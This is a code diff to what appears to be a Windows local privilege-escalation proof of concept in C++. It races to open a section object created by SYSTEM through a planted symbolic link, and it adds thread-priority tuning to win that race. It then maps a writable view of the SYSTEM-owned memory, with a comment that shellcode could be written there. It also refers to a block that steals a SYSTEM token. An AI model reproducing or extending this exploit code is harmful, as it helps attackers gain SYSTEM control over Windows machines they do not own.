@@ -300,6 +300,7 @@ int wmain(int argc, wchar_t** argv)
 
     HANDLE hlnk = NULL;
     HANDLE hmapping = NULL;
+    LPVOID pSectionView = NULL;
 
     NTSTATUS stat = _NtCreateSymbolicLinkObject(&hlnk, GENERIC_ALL, &objattr, &linktarget);
     if (stat)
@@ -314,9 +315,20 @@ int wmain(int argc, wchar_t** argv)
     shi.lpFile = L"C:\\Windows\\System32\\conhost.exe";
     ShellExecuteEx(&shi);
 
+    // Boost priority to improve race-window odds (idea from JoeysCode).
+    SetThreadPriority(GetCurrentThread(), THREAD_PRIORITY_TIME_CRITICAL);
     do {
         _NtOpenSection(&hmapping, MAXIMUM_ALLOWED, &objattr);
+        if (!hmapping) YieldProcessor(); // yield instead of burning the core (idea from JoeysCode)
     } while (!hmapping);
+    SetThreadPriority(GetCurrentThread(), THREAD_PRIORITY_NORMAL);
+
+    // Map a writable view of the SYSTEM-created section (idea from JoeysCode).
+    // Proves we have write access to memory owned by SYSTEM; a real payload
+    // could write shellcode here before a privileged consumer maps it.
+    pSectionView = MapViewOfFile(hmapping, FILE_MAP_ALL_ACCESS, 0, 0, 0);
+    if (pSectionView)
+        printf("[*] SYSTEM section mapped at %p — writable view confirmed\n", pSectionView);
 
     // ---- BEGIN: Added — steal SYSTEM token while ctfmon is still alive ----
     //
@@ -355,6 +367,8 @@ int wmain(int argc, wchar_t** argv)
 cleanup:
     if (hlnk)
         CloseHandle(hlnk);
+    if (pSectionView)
+        UnmapViewOfFile(pSectionView);
     if (hmapping)
     {
         _getch();
